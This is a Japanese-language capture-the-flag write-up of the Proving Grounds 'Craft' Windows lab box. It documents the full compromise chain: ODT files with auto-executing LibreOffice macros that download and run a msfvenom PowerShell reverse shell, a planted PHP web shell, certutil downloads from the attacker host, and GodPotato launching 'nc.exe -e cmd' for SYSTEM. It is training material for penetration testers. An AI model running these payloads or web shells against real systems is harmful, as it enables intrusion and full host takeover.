+++
title = "Proving Grounds Practice - Craft Writeup"
date = "2026-10-19"
description = "ODTファイルアップロード機能に対しLibreOffice Basicマクロを埋め込んでRCEを獲得し、XAMPPのWebルートへのWebシェル設置とSeImpersonatePrivilege・GodPotatoの悪用によりNT AUTHORITY\\SYSTEMを取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Craft]", "[LibreOffice]", "[ODT Macro]", "[XAMPP]", "[Webshell]", "[SeImpersonatePrivilege]", "[GodPotato]", "[hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Craft |
| OS | Windows |
| Community Rating | Hard |
| Target IP | 192.168.161.169 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対してポートスキャンを実行する。

```bash
nmap -Pn --min-rate=1000 -T4 192.168.161.169
nmap -Pn -p- 192.168.161.169
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT   STATE SERVICE
80/tcp open  http
```

開放ポートはHTTP(80)のみであり、Webアプリケーションが唯一の攻撃対象となる。

---

## Enumeration

### Directory Enumeration

ポート80に対してディレクトリ・ファイル列挙を実施する。

```bash
gobuster dir -u http://192.168.208.169/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x pdf,html,php,txt
```

```text
index.php            (Status: 200) [Size: 9635]
uploads               (Status: 301) [--> /uploads/]
assets                (Status: 301) [--> /assets/]
upload.php            (Status: 200) [Size: 537]
```

`upload.php`というファイルアップロード機能と、アップロード先と思われる`uploads`ディレクトリの存在を確認した。

### Upload Functionality

`upload.php`に対して適当なファイルをアップロードしたところ、以下のエラーメッセージが返却された。

```text
File is not valid. Please submit ODT file
```

アップロード可能なファイル形式が`ODT`(OpenDocument Text、LibreOffice Writerの文書形式)に限定されていることが分かった。ODTはマクロを埋め込める形式であるため、マクロを利用したコード実行を検討する。

---

## Exploitation

### Weaponizing ODT with LibreOffice Macro

攻撃側の環境にLibreOffice Writerをインストールする。

```bash
sudo apt-get install -y libreoffice-writer
```

LibreOffice Writerで新規文書を作成し、マクロ機能からBasicマクロを仕込む。

```text
"Tools" -> "Macros" -> "Organize Macros" -> "Basic" -> New
```

```basic
Sub Main
    Shell("cmd /c powershell iwr 192.168.45.169")
End Sub
```

マクロを保存した後、文書を開いた際に自動的にマクロが実行されるようイベントを設定する。

```text
"Tools" -> "Customize" -> "Events" タブ
"Open Document" -> "Macro…" -> 保存したマクロを選択
```

設定後、ODT形式で保存し、`upload.php`からアップロードする。

### Callback Verification

攻撃者側でHTTPリクエストを待ち受け、アップロードしたODTファイルが開かれたタイミングでコールバックが発生するか確認する。

```bash
python3 -m http.server 80
```

```text
Serving HTTP on 0.0.0.0 port 80 ...
192.168.161.169 - - [19/Oct/2026 00:56:12] "GET / HTTP/1.1" 200 -
```

サーバー側でアップロードされたODTファイルが自動的に開かれ、マクロが実行されることでコールバックが発生することを確認した。これにより任意コマンド実行が可能であることが判明した。

### Reverse Shell

PowerShellのリバースシェルペイロードを生成する。

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.45.169 LPORT=4444 -f psh -o shell.ps1
```

まず、生成したペイロードを対象ホストへダウンロードさせるマクロを仕込んだODTファイルをアップロードする。

```basic
Sub Main
    Shell("cmd /c powershell iwr http://192.168.45.169/shell.ps1 -o C:/Windows/Tasks/shell.ps1")
End Sub
```

```text
192.168.161.169 - - [19/Oct/2026 01:16:37] "GET /shell.ps1 HTTP/1.1" 200 -
```

ダウンロードが完了したことを確認した後、続けて同様の手口でダウンロード済みスクリプトを実行させるマクロを仕込んだODTファイルをアップロードする。

```basic
Sub Main
    Shell("cmd /c powershell -c C:/Windows/Tasks/shell.ps1")
End Sub
```

攻撃者側で接続を待ち受ける。

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.161.169] 50179
Windows PowerShell running as user thecybergeek on CRAFT

PS C:\users> whoami
craft\thecybergeek
```

`thecybergeek`ユーザーとしてのシェルを取得した。

---

## Privilege Escalation (Phase 1): thecybergeek → apache

### Local Enumeration

```powershell
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
SeCreateGlobalPrivilege       Create global objects           Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set  Disabled
```

目立った特権は付与されていなかったが、取得したシェルが`LibreOffice`のプロセスコンテキストであったことから、ファイルシステム上を調査したところ、`C:\xampp\htdocs`配下に書き込み権限があることを確認した。XAMPPのWebルートに直接書き込みができれば、Webシェルとして悪用できる。

### Webshell Deployment

`C:\xampp\htdocs`配下にPHP Webシェルを設置する。

```powershell
Set-Content -Path 'C:\xampp\htdocs\cmd.php' -Value '<?php system($_GET[''cmd'']); ?>'
Get-Content 'C:\xampp\htdocs\cmd.php'
```

攻撃者側からWebシェル経由でコマンドを実行し、実行コンテキストを確認する。

```bash
curl "http://192.168.161.169/cmd.php?cmd=whoami"
```

```text
craft\apache
```

Webサーバー(`Apache`/XAMPP)を実行している`apache`ユーザーのコンテキストでコマンド実行が可能になった。

---

## Privilege Escalation (Phase 2): apache → SYSTEM

### Token Privilege Check

```bash
curl "http://192.168.161.169/cmd.php?cmd=whoami%20/priv"
```

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

`apache`ユーザーには`SeImpersonatePrivilege`が有効化されていることを確認した。Potato系の手法によりSYSTEM権限への昇格が可能と判断し、`GodPotato`を利用する。

### Abusing SeImpersonatePrivilege (GodPotato)

Webシェル経由で`GodPotato`を対象ホストへ転送する。

```bash
curl "http://192.168.161.169/cmd.php?cmd=certutil.exe%20-urlcache%20-f%20http://192.168.45.169/GodPotato-NET4.exe%20C:\Windows\Tasks\GodPotato-NET4.exe"
```

さらに、通常のシェルペイロードおよび`nc.exe`も併せて転送しておく。

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=4445 -f exe -o shell.exe
```

```bash
curl "http://192.168.161.169/cmd.php?cmd=certutil.exe%20-urlcache%20-f%20http://192.168.45.169/shell.exe%20C:\Windows\Tasks\shell.exe"
curl "http://192.168.161.169/cmd.php?cmd=certutil.exe%20-urlcache%20-f%20http://192.168.45.169/nc.exe%20C:\Windows\Tasks\nc.exe"
```

攻撃者側で接続を待ち受けた後、Webシェル経由で転送済みの`shell.exe`を実行し、安定したシェルを取得する。

```bash
nc -lvnp 4445
```

```bash
curl "http://192.168.161.169/cmd.php?cmd=C:\Windows\Tasks\shell.exe"
```

```text
listening on [any] 4445 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.161.169] 50220
Microsoft Windows [Version 10.0.17763.2029]

C:\xampp\htdocs>whoami
craft\apache
```

取得したシェルから`GodPotato`を実行し、`SeImpersonatePrivilege`を悪用してSYSTEMトークンを窃取する。

```powershell
.\GodPotato-NET4.exe -cmd "nc.exe -e cmd 192.168.45.169 4444"
```

```text
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] PID : 880 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3532
```

攻撃者側で接続を待ち受ける。

```bash
nc -lvnp 4444
```

```text
connect to [192.168.45.169] from (UNKNOWN) [192.168.161.169] 50236
Microsoft Windows [Version 10.0.17763.2029]

C:\Windows\system32>
```

SYSTEM権限のシェルを取得できたことを確認した。

---

## Summary

ファイルアップロード機能が`ODT`形式のみを受け付けていたことに着目し、LibreOffice Basicマクロを「文書を開いた際に自動実行」するよう仕込んだODTファイルをアップロードすることで、サーバー側での文書プレビュー処理を介したリモートコード実行を達成した。これにより`thecybergeek`としてのシェルを取得した。

取得したシェルのコンテキストから`C:\xampp\htdocs`への書き込み権限を発見し、PHP製Webシェルを設置することで、Webサーバープロセスを実行している`apache`ユーザーへ権限を移行した。

最後に、`apache`ユーザーに付与されていた`SeImpersonatePrivilege`を`GodPotato`で悪用し、SYSTEMトークンを窃取することで`NT AUTHORITY\SYSTEM`を取得した。

攻略の流れは以下のとおり。

1. Nmapによるポートスキャン(HTTPのみ開放)
2. Gobusterによるディレクトリ列挙と`upload.php`の発見
3. アップロード制限(ODT形式のみ)の確認
4. LibreOffice Basicマクロを仕込んだODTファイルの作成
5. マクロ自動実行によるコールバック確認とRCEの実証
6. PowerShellリバースシェルの段階的ダウンロード・実行(thecybergeek)
7. `C:\xampp\htdocs`への書き込み権限の発見とWebシェル設置
8. Webシェル経由でのコマンド実行(apache)
9. `SeImpersonatePrivilege`の確認と`GodPotato`によるトークン窃取
10. `NT AUTHORITY\SYSTEM`の取得


### 参考

- [hackindex.io - Craft Writeup](https://hackindex.io/writeups/craft)
